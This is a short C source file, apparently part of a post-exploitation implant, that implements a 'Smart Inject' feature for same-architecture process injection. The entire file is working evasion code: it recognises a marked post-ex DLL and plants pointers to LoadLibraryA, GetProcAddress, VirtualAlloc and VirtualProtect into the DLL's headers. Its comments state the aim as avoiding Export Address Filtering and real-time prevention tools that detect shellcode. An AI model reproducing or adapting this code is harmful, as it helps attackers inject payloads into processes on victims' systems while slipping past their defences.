/*
 * Smart Inject is a feature to propagate pointers to a DLL when doing same-arch process
 * injection. This is a means to avoid EAF and real-time prevention measures that use
 * EAF-like techniques to detect shellcode settling into a process.
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include "beacon.h"
#include "inject.h"
#include "commands.h"

/* our smart inject pointers */
typedef struct {
	LPVOID pLoadLibraryA;
	LPVOID pGetProcAddress;
	LPVOID pVirtualAlloc;
	LPVOID pVirtualProtect;
	DWORD  check;
} SMARTINJECT;

/* a quick view to check if we're a SmartInject-enabled DLL */
typedef struct {
	WORD  magic;
	char  padding[1018];
	DWORD header;
} SMARTINJECTCHECK;

/* determine if smart inject is on (or not) */
BOOL isSmartInject(char * buffer, int length) {
	SMARTINJECTCHECK * check;
	
	/* our smallest post-ex DLL is still >=50KB */
	if (length < 51200)
		return FALSE;

	/* cast our buffer to our header */
	check = (SMARTINJECTCHECK *)buffer;

	/* look for the smart inject protocol */
	return check->magic == 0x5A4D && check->header == 0xF4F4F4F4;
}

/* how much (if any) to later our buffer value */
void SetupSmartInject(INJECTCONTEXT * context, char * buffer, int length) {
	SMARTINJECT * ptrs;

	/* if we're not smart inject, do nothing */
	if (!isSmartInject(buffer, length)) {
		return;
	}

	/* check that we're the same arch! */
	if (!context->sameArch)
		return;

	/* we're located right at the end of the headers */
	ptrs = (SMARTINJECT *)((buffer + 1024) - sizeof(SMARTINJECT));

	/* setup our smart inject values */
	ptrs->check = 0xF00D;
	ptrs->pGetProcAddress = (LPVOID)GetProcAddress;
	ptrs->pLoadLibraryA   = (LPVOID)LoadLibraryA;
	ptrs->pVirtualAlloc   = (LPVOID)VirtualAlloc;
	ptrs->pVirtualProtect = (LPVOID)VirtualProtect;

	return;
}
